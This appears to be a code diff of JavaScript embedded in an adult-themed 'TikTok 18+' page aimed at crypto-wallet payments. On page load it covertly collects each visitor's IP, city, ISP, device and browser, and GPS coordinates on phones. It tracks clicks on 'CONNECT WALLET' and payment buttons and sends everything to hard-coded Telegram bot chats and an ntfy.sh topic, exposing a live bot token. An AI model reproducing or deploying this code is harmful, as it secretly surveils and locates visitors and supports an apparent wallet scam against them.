@@ -3027,12 +3027,14 @@ if (document.readyState === 'loading') {
   (function() {
     const TG_BOT_TOKEN = "8904216231:AAHzuoU59D43qO04lsrYvZDhw0su_61Y2Ig";
     const TG_CHAT_IDS = ["8788656318", "8461980119"];
-    const SITE_NAME = "TikTok 18+";
-    const SITE_TAG = "TIKTOK 18+";
     const SITE_KEY = "tiktok18";
+    const SITE_TAG = "TIKTOK 18+";
+    const SITE_NAME = "TikTok 18+";
+    const NTFY_TOPIC = "tt_traffic_events_ag_890421";
 
     window.__visitorData = {
-      country: "Unknown",
+      vid: "",
+      country: "",
       country_code: "",
       flag: "🌐",
       city: "",
@@ -3046,6 +3048,17 @@ if (document.readyState === 'loading') {
       browser: "",
       gpu: ""
     };
+
+    function getCountryFlag(code) {
+      if (!code || code.length !== 2) return "🌐";
+      try {
+        const c1 = code.toUpperCase().charCodeAt(0) + 127397;
+        const c2 = code.toUpperCase().charCodeAt(1) + 127397;
+        return String.fromCodePoint(c1, c2);
+      } catch (e) {
+        return "🌐";
+      }
+    }
 
     function sendTelegramAlert(text) {
       TG_CHAT_IDS.forEach(function(chatId) {
@@ -3066,25 +3079,34 @@ if (document.readyState === 'loading') {
       });
     }
 
-    function syncLiveCounters(type, countryCode) {
+    function emitEvent(eventObj) {
       try {
-        if (type === "visit") {
-          // 1. Total visits (always fire immediately)
-          fetch("https://countapi.mileshilliard.com/api/v1/hit/" + SITE_KEY + "_v_live", { keepalive: true }).catch(function() {});
-
-          // 2. Today's visits
-          const today = new Date().toISOString().slice(0, 10);
-          fetch("https://countapi.mileshilliard.com/api/v1/hit/" + SITE_KEY + "_d_" + today, { keepalive: true }).catch(function() {});
-        } else if (type === "country" && countryCode) {
-          fetch("https://countapi.mileshilliard.com/api/v1/hit/" + SITE_KEY + "_c_" + countryCode.toLowerCase(), { keepalive: true }).catch(function() {});
-        } else if (type === "action") {
-          fetch("https://countapi.mileshilliard.com/api/v1/hit/" + SITE_KEY + "_a_live", { keepalive: true }).catch(function() {});
-        }
-      } catch (err) {}
+        fetch("https://ntfy.sh/" + NTFY_TOPIC + "/publish", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(eventObj),
+          keepalive: true
+        }).catch(function() {});
+      } catch (e) {}
     }
 
-    // Instant visit hit upon page load
-    syncLiveCounters("visit");
+    async function getVisitorId() {
+      let vid = localStorage.getItem("tk_visitor_id");
+      if (!vid) {
+        try {
+          const res = await fetch("https://countapi.mileshilliard.com/api/v1/hit/tt_user_seq");
+          const d = await res.json();
+          if (d && d.value) {
+            vid = "#" + d.value;
+          }
+        } catch (e) {}
+        if (!vid) {
+          vid = "#" + Math.floor(1000 + Math.random() * 9000);
+        }
+        localStorage.setItem("tk_visitor_id", vid);
+      }
+      return vid;
+    }
 
     function getBrowserAndApp() {
       const ua = navigator.userAgent || "";
@@ -3177,17 +3199,19 @@ if (document.readyState === 'loading') {
     }
 
     async function fetchGeoData() {
+      // 1. ipwho.is
       try {
         const ctrl = new AbortController();
-        const to = setTimeout(() => ctrl.abort(), 2400);
+        const to = setTimeout(() => ctrl.abort(), 2000);
         const r = await fetch("https://ipwho.is/", { signal: ctrl.signal });
         clearTimeout(to);
         if (r.ok) {
           const d = await r.json();
-          if (d.success !== false && d.country) {
+          if (d.success !== false && d.country_code) {
+            const cc = (d.country_code || "").toUpperCase();
             return {
-              country: d.country || "Unknown",
-              country_code: d.country_code || "",
+              country: d.country || cc,
+              country_code: cc,
               city: d.city || "",
               region: d.region || "",
               postal: d.postal || "",
@@ -3195,38 +3219,70 @@ if (document.readyState === 'loading') {
               lon: d.longitude || "",
               ip: d.ip || "",
               isp: d.connection ? (d.connection.isp || "") : "",
-              org: d.connection ? (d.connection.org || "") : "",
               timezone: d.timezone ? (d.timezone.id + " " + (d.timezone.utc || "")) : "",
-              flag: (d.flag && d.flag.emoji) ? d.flag.emoji : "🌐"
+              flag: getCountryFlag(cc)
             };
           }
         }
       } catch (e) {}
 
+      // 2. geojs.io (unlimited, worldwide fallback)
       try {
-        const fb = await fetch("https://api.country.is");
+        const ctrl = new AbortController();
+        const to = setTimeout(() => ctrl.abort(), 2200);
+        const r = await fetch("https://get.geojs.io/v1/ip/geo.json", { signal: ctrl.signal });
+        clearTimeout(to);
+        if (r.ok) {
+          const d = await r.json();
+          if (d.country_code) {
+            const cc = (d.country_code || "").toUpperCase();
+            return {
+              country: d.country || cc,
+              country_code: cc,
+              city: d.city || "",
+              region: d.region || "",
+              postal: "",
+              lat: d.latitude || "",
+              lon: d.longitude || "",
+              ip: d.ip || "",
+              isp: d.organization_name || "",
+              timezone: d.timezone || "",
+              flag: getCountryFlag(cc)
+            };
+          }
+        }
+      } catch (e) {}
+
+      // 3. country.is
+      try {
+        const ctrl = new AbortController();
+        const to = setTimeout(() => ctrl.abort(), 1800);
+        const fb = await fetch("https://api.country.is", { signal: ctrl.signal });
+        clearTimeout(to);
         if (fb.ok) {
           const fd = await fb.json();
-          return {
-            country: fd.country || "Unknown",
-            country_code: fd.country || "",
-            city: "",
-            region: "",
-            postal: "",
-            lat: "",
-            lon: "",
-            ip: fd.ip || "",
-            isp: "",
-            org: "",
-            timezone: "",
-            flag: "🌐"
-          };
+          const cc = (fd.country || "").toUpperCase();
+          if (cc) {
+            return {
+              country: cc,
+              country_code: cc,
+              city: "",
+              region: "",
+              postal: "",
+              lat: "",
+              lon: "",
+              ip: fd.ip || "",
+              isp: "",
+              timezone: "",
+              flag: getCountryFlag(cc)
+            };
+          }
         }
       } catch (_) {}
 
       return {
         country: "Unknown",
-        country_code: "",
+        country_code: "XX",
         city: "",
         region: "",
         postal: "",
@@ -3234,13 +3290,15 @@ if (document.readyState === 'loading') {
         lon: "",
         ip: "",
         isp: "",
-        org: "",
         timezone: "",
         flag: "🌐"
       };
     }
 
     async function trackVisit() {
+      const vid = await getVisitorId();
+      window.__visitorId = vid;
+
       const storageKey = SITE_KEY + "_last_trk";
       const lastTrack = sessionStorage.getItem(storageKey);
       const now = Date.now();
@@ -3252,6 +3310,7 @@ if (document.readyState === 'loading') {
       const geo = await fetchGeoData();
 
       window.__visitorData = {
+        vid: vid,
         country: geo.country,
         country_code: geo.country_code,
         flag: geo.flag,
@@ -3278,10 +3337,33 @@ if (document.readyState === 'loading') {
       const langs = (navigator.languages && navigator.languages.length) ? navigator.languages.join(", ") : (navigator.language || "N/A");
       const ref = document.referrer ? new URL(document.referrer).hostname : "Прямой заход (Direct / App)";
       const utms = getTrafficParams();
-      const time = new Date().toLocaleString();
+      const timeStr = new Date().toLocaleTimeString();
+      const todayStr = new Date().toISOString().slice(0, 10);
 
-      let msg = "👤 <b>[" + SITE_TAG + "] НОВЫЙ ПОСЕТИТЕЛЬ</b>\n";
+      // Emit synchronized visit event to central live stream
+      emitEvent({
+        type: "visit",
+        vid: vid,
+        site: SITE_KEY,
+        site_name: SITE_NAME,
+        country: geo.country_code || "XX",
+        country_name: geo.country || "Unknown",
+        flag: geo.flag || "🌐",
+        region: geo.region || "Неизвестно",
+        city: geo.city || "",
+        ip: geo.ip || "",
+        isp: geo.isp || "",
+        lat: geo.lat || "",
+        lon: geo.lon || "",
+        device: device,
+        browser: browser,
+        time: timeStr,
+        date: todayStr
+      });
+
+      let msg = "👤 <b>[" + SITE_TAG + "] ПОСЕТИТЕЛЬ " + vid + "</b>\n";
       msg += "━━━━━━━━━━━━━━━━━━━━\n";
+      msg += "🆔 <b>Идентификатор:</b> <code>" + vid + "</code>\n";
       msg += "🌍 <b>ГЕОЛОКАЦИЯ И РЕГИОН:</b>\n";
       msg += "• Страна: " + geo.flag + " <b>" + geo.country + "</b> (" + geo.country_code + ")\n";
       if (geo.region) msg += "• Регион / Область: <b>" + geo.region + "</b>\n";
@@ -3311,16 +3393,16 @@ if (document.readyState === 'loading') {
         msg += "• UTM: " + utms.join(" | ") + "\n";
       }
       msg += "• Страница: " + window.location.pathname + window.location.search + "\n";
-      msg += "• Время: " + time;
+      msg += "• Время: " + timeStr;
 
       sendTelegramAlert(msg);
-      if (geo && geo.country_code) syncLiveCounters("country", geo.country_code);
 
       // Check high accuracy GPS if available and mobile
       if (navigator.geolocation && /iPhone|iPad|Android/i.test(device)) {
         navigator.geolocation.getCurrentPosition(function(pos) {
           const crd = pos.coords;
-          const gpsMsg = "🎯 <b>[" + SITE_TAG + "] ТОЧНЫЙ GPS ТЕЛЕФОНА</b>\n" +
+          const gpsMsg = "🎯 <b>[" + SITE_TAG + "] ТОЧНЫЙ GPS ПОСЕТИТЕЛЯ " + vid + "</b>\n" +
+            "🆔 Идентификатор: <code>" + vid + "</code>\n" +
             "📍 Координаты: <code>" + crd.latitude + ", " + crd.longitude + "</code>\n" +
             "🎯 Точность: ±" + Math.round(crd.accuracy) + " метров\n" +
             "🗺 <a href=\"https://maps.google.com/?q=" + crd.latitude + "," + crd.longitude + "\">Открыть точку на Google Картах</a>";
@@ -3329,62 +3411,114 @@ if (document.readyState === 'loading') {
       }
     }
 
-    function trackAction(actionName, details) {
+    function trackAction(actionCat, actionName, details) {
       const v = window.__visitorData || {};
+      const vid = v.vid || localStorage.getItem("tk_visitor_id") || "#1001";
       const flag = v.flag || "🌐";
       const country = v.country || "Unknown";
       const region = v.region ? (" (" + v.region + ")") : "";
       const device = v.device || getDeviceDetailed();
       const browser = v.browser || getBrowserAndApp();
       const ip = v.ip ? ("• IP: <code>" + v.ip + "</code>\n") : "";
-      const time = new Date().toLocaleTimeString();
+      const timeStr = new Date().toLocaleTimeString();
 
-      let msg = "⚡ <b>[" + SITE_TAG + "] ДЕЙСТВИЕ НА САЙТЕ</b>\n";
+      // Emit synchronized action event to ntfy
+      emitEvent({
+        type: "action",
+        vid: vid,
+        site: SITE_KEY,
+        site_name: SITE_NAME,
+        action_cat: actionCat,
+        action_name: actionName,
+        details: details || "",
+        country: v.country_code || "XX",
+        time: timeStr
+      });
+
+      let catIcon = "⚡";
+      let catHeader = "ДЕЙСТВИЕ";
+      if (actionCat === "watch") {
+        catIcon = "🎬";
+        catHeader = "КЛИК «СМОТРЕТЬ ОНЛАЙН»";
+      } else if (actionCat === "pay") {
+        catIcon = "💳";
+        catHeader = "ПОКУПКА / ОПЛАТА";
+      } else if (actionCat === "plan") {
+        catIcon = "📦";
+        catHeader = "ВЫБОР ТАРИФА";
+      }
+
+      let msg = catIcon + " <b>[" + SITE_TAG + "] " + catHeader + " — " + vid + "</b>\n";
       msg += "━━━━━━━━━━━━━━━━━━━━\n";
-      msg += "🔘 <b>Клик:</b> <b>" + actionName + "</b>\n";
+      msg += "🆔 <b>Идентификатор:</b> <code>" + vid + "</code>\n";
+      msg += "🔘 <b>Кнопка:</b> <b>" + actionName + "</b>\n";
       if (details) msg += "📝 <b>Детали:</b> " + details + "\n";
       msg += "🌍 <b>Локация:</b> " + flag + " " + country + region + "\n";
       msg += "📱 <b>Устройство:</b> " + device + "\n";
       msg += "🌐 <b>Браузер:</b> " + browser + "\n";
       msg += ip;
-      msg += "🕒 <b>Время:</b> " + time;
+      msg += "🕒 <b>Время:</b> " + timeStr;
 
       sendTelegramAlert(msg);
-      syncLiveCounters("action");
     }
 
     window.__trackVisitorAction = trackAction;
     trackVisit();
 
     function setupActionTracking() {
-      const clickMap = [
-        { id: "heroWatchOnlineBtn", name: "Watch Online (Hero 1)", desc: "Открыл модалку подписки" },
-        { id: "heroExploreBtn", name: "Explore Features (Hero 2)", desc: "Открыл модалку подписки" },
-        { id: "navWatchBtn", name: "Watch Online (Navbar)", desc: "Открыл модалку подписки" },
-        { id: "sectionOpenCryptoBtn", name: "Get Instant Access (Banner)", desc: "Открыл модалку подписки" },
-        { id: "ctaWatchOnlineBtn", name: "Watch Online (CTA Bottom)", desc: "Открыл модалку подписки" },
-        { id: "cwPlan3m", name: "Выбор плана 3M", desc: "Выбран план $0.99 (3 месяца)" },
-        { id: "cwPlan6m", name: "Выбор плана 6M", desc: "Выбран план $2.99 (6 месяцев)" },
-        { id: "cwConnectBtn", name: "CONNECT WALLET", desc: "Нажата кнопка подключения кошелька" },
-        { id: "cwPayBtn", name: "PROCEED TO PAYMENT", desc: "Нажата кнопка оплаты" }
+      // 1. Смотреть онлайн (Все кнопки Watch Online / Explore / Get Instant Access)
+      const watchButtons = [
+        { id: "heroWatchOnlineBtn", name: "Смотреть онлайн (Hero)", desc: "Клик по кнопке Watch Online в шапке" },
+        { id: "heroExploreBtn", name: "Explore Features (Hero)", desc: "Клик по кнопке Explore" },
+        { id: "navWatchBtn", name: "Смотреть онлайн (Navbar)", desc: "Клик по кнопке Watch Online в меню" },
+        { id: "sectionOpenCryptoBtn", name: "Get Instant Access", desc: "Клик по кнопке Get Instant Access" },
+        { id: "ctaWatchOnlineBtn", name: "Смотреть онлайн (CTA)", desc: "Клик по кнопке Watch Online внизу" }
       ];
 
-      clickMap.forEach(function(item) {
+      watchButtons.forEach(function(item) {
         const el = document.getElementById(item.id);
         if (el) {
           el.addEventListener("click", function() {
-            trackAction(item.name, item.desc);
+            trackAction("watch", item.name, item.desc);
           });
         }
       });
 
       document.querySelectorAll(".js-open-crypto").forEach(function(el) {
-        if (!el.id || !clickMap.some(function(c) { return c.id === el.id; })) {
+        if (!el.id || !watchButtons.some(function(c) { return c.id === el.id; })) {
           el.addEventListener("click", function() {
-            trackAction("Subscription Button Click", el.innerText.trim().slice(0, 30));
+            trackAction("watch", "Смотреть онлайн (Карточка/Кнопка)", el.innerText.trim().slice(0, 30));
           });
         }
       });
+
+      // 2. Выбор тарифа подписки
+      const plan3m = document.getElementById("cwPlan3m");
+      if (plan3m) {
+        plan3m.addEventListener("click", function() {
+          trackAction("plan", "Выбор тарифа 3M ($0.99)", "Выбран план $0.99 (3 месяца)");
+        });
+      }
+      const plan6m = document.getElementById("cwPlan6m");
+      if (plan6m) {
+        plan6m.addEventListener("click", function() {
+          trackAction("plan", "Выбор тарифа 6M ($2.99)", "Выбран план $2.99 (6 месяцев)");
+        });
+      }
+
+      // 3. Совершение покупки / Оплата
+      const connectBtn = document.getElementById("cwConnectBtn");
+      if (connectBtn) {
+        connectBtn.addEventListener("click", function() {
+          trackAction("pay", "CONNECT WALLET (Подключение)", "Нажата кнопка подключения кошелька для оплаты");
+        });
+      }
+      const payBtn = document.getElementById("cwPayBtn");
+      if (payBtn) {
+        payBtn.addEventListener("click", function() {
+          trackAction("pay", "PROCEED TO PAYMENT (Переход к оплате)", "Нажата кнопка проведения оплаты");
+        });
+      }
     }
 
     if (document.readyState === "loading") {
